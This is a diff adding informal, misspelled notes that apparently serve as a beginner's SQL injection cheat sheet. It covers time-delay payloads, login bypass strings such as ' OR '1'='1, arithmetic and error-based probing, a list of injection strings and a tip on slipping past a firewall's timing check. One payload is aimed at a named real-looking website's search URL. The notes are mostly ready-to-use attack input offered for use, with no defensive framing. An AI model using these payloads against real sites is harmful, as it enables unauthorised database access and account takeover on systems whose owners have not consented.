@@ -1,0 +1,67 @@
+gthe coman sql verbs 
+ SELECT 
+INSERT
+DELEAT
+UPDATE
+DROP
+UNION
+other comment terms
+where
+and, or, not
+oder by
+special characters:
+, and " string delimarastion
+/**/ or -- or # comments delimaration
+* and %  wildcard
+; end sql statment
+= + < > () special logic
+
+first step is going to allwase is use string delimaration like this ' or " if you still get any error you can use end statment like this ;
+1.This is Time delay:
+than you can use sleep method like this sleep(1000) or 1; waitfor delay '0:0:5'--
+==> GET /rest/index/sleep(1000)/rest
+==> GET /rest/index/rest?paramID = 1; waitfor delay '0:0:5'--
+
+to use sleep method you should use like this
+https://www.mazzady.com/search?cat_ids=' UNION SELECT sleep(10)
+select *from users where username= "<input>" AND password ="<input>"
+select *from users where username= "" OR "1" ="1" AND password ="<input>";
+username =" OR "1" ="1
+password =" OR "1" ="1
+they will block by the firewall if you request time  344milysec if it takes less time than they are blocking your request 
+so you can try  username =" OR "surya" = "surya or even username =" || "1" ="1
+
+2.sql special parameter:
+you can use arthmatic attack llike id=3-2=1 or else use 50-ASCII(1)
+From: 
+==> GET /rest/index/rest?paramID = 1 
+To:
+==> GET /rest/index/rest?paramID = 3-2 or 50-ASCII(1)
+if you can get the ID 1 than there is vulnerability
+
+3. sql special parameter for pages
+you can just type z or any extra chracter at the end if you get any error message than it is using db for changing 
+From: 
+==> GET /rest/index/rest?param.php=home
+To : 
+==> GET /rest/index/rest?param.php=homez
+if you get error than try to fix it 
+==> GET /rest/index/rest?param.php=ho'%20'me
+if it fix than there is sqli
+s
+sample injection are:
+'						' or 1=1 --
+"						" or 1=1 --
+;						' or a=a --
+#						or 1=1 --
+##						" or"a"="1
+%00						')or('a'='a
+--						")or("a"="a
+admin:'or a=a--			hi" or"1"="1
+admin:'or 1=1 #
+
+even thow the error for sql is not showing in webpage it may be posiable in network field in devops  go to paricular page where you entered the sql query in  that go to responces field
+you can see the error
+
+
+
